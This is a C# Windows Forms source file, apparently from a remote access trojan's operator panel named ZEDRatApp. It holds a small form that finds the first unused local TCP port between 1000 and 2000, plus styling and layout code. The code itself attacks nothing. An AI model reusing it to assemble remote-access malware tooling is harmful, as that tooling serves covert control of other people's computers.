using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Windows.Forms;
using Bunifu.UI.WinForms;
using Guna.UI2.WinForms;


using TextBox = System.Windows.Forms.TextBox;

namespace ZEDRatApp.Forms
{
	public class FrmFindOpenPort : Form
	{
		private IContainer components;

		private Guna2Elipse Guna2Elipse1;

		private Guna2TextBox txtOpen;

		private Guna2Button btnBuild;

		private Guna2Elipse Guna2Elipse2;

		private Guna2ShadowForm guna2ShadowForm1;

		private Guna2ControlBox Guna2ControlBox1;

		private Guna2PictureBox Guna2PictureBox1;

		private Guna2HtmlLabel Guna2HtmlLabel12;

		private BunifuSeparator bunifuSeparator2;

		public FrmFindOpenPort()
		{
			this.InitializeComponent();
		}

		private string GetOpenPort()
		{
			int num = 2000;
			List<int> list = (from p in IPGlobalProperties.GetIPGlobalProperties().GetActiveTcpListeners()
				select p.Port).ToList();
			int num2 = 0;
			for (int i = 1000; i < num; i++)
			{
				if (!list.Contains(i))
				{
					num2 = i;
					break;
				}
			}
			return num2.ToString();
		}

		private void btnBuild_Click(object sender, EventArgs e)
		{
			(this.txtOpen).Text = this.GetOpenPort();
		}

		private void siticoneGradientCircleButton1_Click(object sender, EventArgs e)
		{
			base.Close();
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			this.components = new System.ComponentModel.Container();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(ZEDRatApp.Forms.FrmFindOpenPort));
			this.Guna2Elipse1 = new Guna2Elipse(this.components);
			this.btnBuild = new Guna2Button();
			this.txtOpen = new Guna2TextBox();
			this.Guna2Elipse2 = new Guna2Elipse(this.components);
			this.guna2ShadowForm1 = new Guna.UI2.WinForms.Guna2ShadowForm(this.components);
			this.Guna2ControlBox1 = new Guna2ControlBox();
			this.Guna2PictureBox1 = new Guna2PictureBox();
			this.Guna2HtmlLabel12 = new Guna2HtmlLabel();
			this.bunifuSeparator2 = new Bunifu.UI.WinForms.BunifuSeparator();
			((System.ComponentModel.ISupportInitialize)this.Guna2PictureBox1).BeginInit();
			base.SuspendLayout();
			this.Guna2Elipse1.BorderRadius = 0;
			this.Guna2Elipse1.TargetControl = this;
			((System.Windows.Forms.Control)(object)this.btnBuild).Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			(this.btnBuild).BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			(this.btnBuild).BorderThickness = 1;
			(this.btnBuild).CheckedState.Parent = this.btnBuild;
			(this.btnBuild).CustomBorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			(this.btnBuild).CustomBorderThickness = new System.Windows.Forms.Padding(1, 0, 0, 0);
			(this.btnBuild).CustomImages.Parent = this.btnBuild;
			(this.btnBuild).FillColor = System.Drawing.Color.FromArgb(18, 15, 24);
			((System.Windows.Forms.Control)(object)this.btnBuild).Font = new System.Drawing.Font("Century Gothic", 9f);
			((System.Windows.Forms.Control)(object)this.btnBuild).ForeColor = System.Drawing.Color.White;
			((System.Windows.Forms.Control)(object)this.btnBuild).Location = new System.Drawing.Point(590, 180);
			((System.Windows.Forms.Control)(object)this.btnBuild).Name = "btnBuild";
			(this.btnBuild).ShadowDecoration.Parent = (System.Windows.Forms.Control)(object)this.btnBuild;
			((System.Windows.Forms.Control)(object)this.btnBuild).Size = new System.Drawing.Size(167, 36);
			((System.Windows.Forms.Control)(object)this.btnBuild).TabIndex = 23;
			((System.Windows.Forms.Control)(object)this.btnBuild).Text = "Find First Open Port";
			((System.Windows.Forms.Control)(object)this.btnBuild).Click += new System.EventHandler(btnBuild_Click);
			((System.Windows.Forms.Control)(object)this.txtOpen).Anchor = System.Windows.Forms.AnchorStyles.None;
			this.txtOpen.BorderThickness = 0;
			((System.Windows.Forms.Control)(object)this.txtOpen).Cursor = System.Windows.Forms.Cursors.IBeam;
			(this.txtOpen).DefaultText = "";
			this.txtOpen.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
			this.txtOpen.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
			this.txtOpen.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			this.txtOpen.DisabledState.Parent = this.txtOpen;
			this.txtOpen.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			this.txtOpen.FillColor = System.Drawing.Color.FromArgb(18, 15, 24);
			this.txtOpen.FocusedState.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.txtOpen.FocusedState.Parent = this.txtOpen;
			((System.Windows.Forms.Control)(object)this.txtOpen).Location = new System.Drawing.Point(33, 89);
			((System.Windows.Forms.Control)(object)this.txtOpen).Name = "txtOpen";
			(this.txtOpen).PasswordChar = '\0';
			this.txtOpen.PlaceholderText = "";
			(this.txtOpen).SelectedText = "";
			this.txtOpen.ShadowDecoration.Parent = (System.Windows.Forms.Control)(object)this.txtOpen;
			((System.Windows.Forms.Control)(object)this.txtOpen).Size = new System.Drawing.Size(724, 84);
			((System.Windows.Forms.Control)(object)this.txtOpen).TabIndex = 24;
			this.Guna2Elipse2.BorderRadius = 40;
			this.Guna2Elipse2.TargetControl = (System.Windows.Forms.Control)(object)this.txtOpen;
			this.guna2ShadowForm1.TargetForm = this;
			((System.Windows.Forms.Control)(object)this.Guna2ControlBox1).Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			((System.Windows.Forms.Control)(object)this.Guna2ControlBox1).BackColor = System.Drawing.Color.Transparent;
			this.Guna2ControlBox1.BorderColor = System.Drawing.Color.DarkGray;
			this.Guna2ControlBox1.BorderRadius = 12;
			this.Guna2ControlBox1.FillColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.Guna2ControlBox1.IconColor = System.Drawing.Color.Black;
			((System.Windows.Forms.Control)(object)this.Guna2ControlBox1).Location = new System.Drawing.Point(743, 12);
			((System.Windows.Forms.Control)(object)this.Guna2ControlBox1).Name = "Guna2ControlBox1";
			this.Guna2ControlBox1.PressedColor = System.Drawing.Color.Red;
			this.Guna2ControlBox1.ShadowDecoration.Parent = (System.Windows.Forms.Control)(object)this.Guna2ControlBox1;
			((System.Windows.Forms.Control)(object)this.Guna2ControlBox1).Size = new System.Drawing.Size(45, 29);
			((System.Windows.Forms.Control)(object)this.Guna2ControlBox1).TabIndex = 25;
			((System.Windows.Forms.Control)(object)this.Guna2PictureBox1).Location = new System.Drawing.Point(12, 12);
			((System.Windows.Forms.Control)(object)this.Guna2PictureBox1).Name = "Guna2PictureBox1";
			this.Guna2PictureBox1.ShadowDecoration.Parent = (System.Windows.Forms.Control)(object)this.Guna2PictureBox1;
			((System.Windows.Forms.Control)(object)this.Guna2PictureBox1).Size = new System.Drawing.Size(37, 35);
			((System.Windows.Forms.PictureBox)(object)this.Guna2PictureBox1).SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
			((System.Windows.Forms.PictureBox)(object)this.Guna2PictureBox1).TabIndex = 53;
			((System.Windows.Forms.PictureBox)(object)this.Guna2PictureBox1).TabStop = false;
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel12).Anchor = System.Windows.Forms.AnchorStyles.Top;
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel12).BackColor = System.Drawing.Color.Transparent;
			this.Guna2HtmlLabel12.Font = new System.Drawing.Font("Century Gothic", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.Guna2HtmlLabel12.ForeColor = System.Drawing.Color.LightGray;
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel12).Location = new System.Drawing.Point(347, 19);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel12).Name = "Guna2HtmlLabel12";
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel12).Size = new System.Drawing.Size(102, 23);
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel12).TabIndex = 54;
			((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel12).Text = "Port Scanner";
			this.bunifuSeparator2.BackColor = System.Drawing.Color.Transparent;
			this.bunifuSeparator2.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator2.BackgroundImage");
			this.bunifuSeparator2.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuSeparator2.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
			this.bunifuSeparator2.LineColor = System.Drawing.Color.DimGray;
			this.bunifuSeparator2.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.DoubleEdgeFaded;
			this.bunifuSeparator2.LineThickness = 1;
			this.bunifuSeparator2.Location = new System.Drawing.Point(-2, 52);
			this.bunifuSeparator2.Margin = new System.Windows.Forms.Padding(6, 2, 6, 2);
			this.bunifuSeparator2.Name = "bunifuSeparator2";
			this.bunifuSeparator2.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Horizontal;
			this.bunifuSeparator2.Size = new System.Drawing.Size(801, 9);
			this.bunifuSeparator2.TabIndex = 91;
			base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			base.ClientSize = new System.Drawing.Size(800, 228);
			base.Controls.Add(this.bunifuSeparator2);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.Guna2HtmlLabel12);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.Guna2PictureBox1);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.Guna2ControlBox1);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.txtOpen);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.btnBuild);
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.Name = "FrmFindOpenPort";
			base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
			this.Text = "FrmFindOpenPort";
			((System.ComponentModel.ISupportInitialize)this.Guna2PictureBox1).EndInit();
			base.ResumeLayout(false);
			base.PerformLayout();
		}
	}
}
